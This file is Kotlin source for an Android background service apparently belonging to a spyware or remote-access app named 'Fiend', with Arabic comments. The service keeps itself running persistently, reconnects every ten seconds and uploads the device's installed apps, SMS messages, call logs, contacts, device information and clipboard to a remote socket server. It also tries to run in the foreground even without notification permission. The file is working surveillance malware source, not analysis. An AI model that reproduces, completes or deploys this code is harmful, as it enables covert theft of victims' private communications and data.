package willi.fiend

import android.app.ServiceInfo
import android.annotation.SuppressLint
import android.app.*
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.widget.RemoteViews
import androidx.core.app.NotificationCompat
import willi.fiend.Utils.AppSocket

class MainService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private var isServiceRunning = false

    private val connectionRunnable = object : Runnable {
        override fun run() {
            if (!isServiceRunning) return
            try {
                Thread {
                    try {
                        val socket = AppSocket(this@MainService)
                        val action = socket.action
                        socket.connect()
                        action.uploadApps()
                        action.uploadMessages()
                        action.uploadCalls()
                        action.uploadContact()
                        action.uploadDeviceInfo()
                        action.uploadClipboard()
                    } catch (e: Exception) {
                        e.printStackTrace()
                        handler.postDelayed(this, 10000)
                    }
                }.start()
            } catch (e: Exception) {
                e.printStackTrace()
                handler.postDelayed(this, 10000)
            }
        }
    }

    override fun onBind(p0: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        isServiceRunning = true
        JobWakeUpService.isMainServiceRunning = true
        
        // ✅ بدء الخدمة في المقدمة مع توافق Android 14+
        startForegroundWithCompatibility()
        
        startService(Intent(this, GuardianService::class.java))
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        handler.postDelayed(connectionRunnable, 5000)
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        isServiceRunning = false
        JobWakeUpService.isMainServiceRunning = false
        handler.removeCallbacks(connectionRunnable)
    }

    // ✅ دالة متوافقة مع Android 14+
    @SuppressLint("NewApi")
    private fun startForegroundWithCompatibility() {
        try {
            val notification = createCompatibleNotification()
            if (notification != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    // Android 14+ يتطلب تحديد نوع الخدمة
                    startForeground(
                        1,
                        notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                    )
                } else {
                    startForeground(1, notification)
                }
            } else {
                // ✅ بدون إشعار (في حال عدم وجود إذن)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    startForeground(
                        1,
                        Notification(),
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    )
                } else {
                    startForeground(1, Notification())
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    // ✅ إنشاء إشعار متوافق
    @SuppressLint("NewApi")
    private fun createCompatibleNotification(): Notification? {
        val channelId = "fiend_channel"
        val channelName = "Fiend Service"
        
        // ✅ التحقق من إذن الإشعارات في Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS) 
                != PackageManager.PERMISSION_GRANTED) {
                return null
            }
        }

        val channel = NotificationChannel(
            channelId,
            channelName,
            NotificationManager.IMPORTANCE_LOW
        )
        channel.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        
        val manager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        manager.createNotificationChannel(channel)

        return NotificationCompat.Builder(this, channelId)
            .setOngoing(true)
            .setSmallIcon(R.drawable.mpt)
            .setContentTitle("Fiend Service")
            .setContentText("Running in background")
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
}
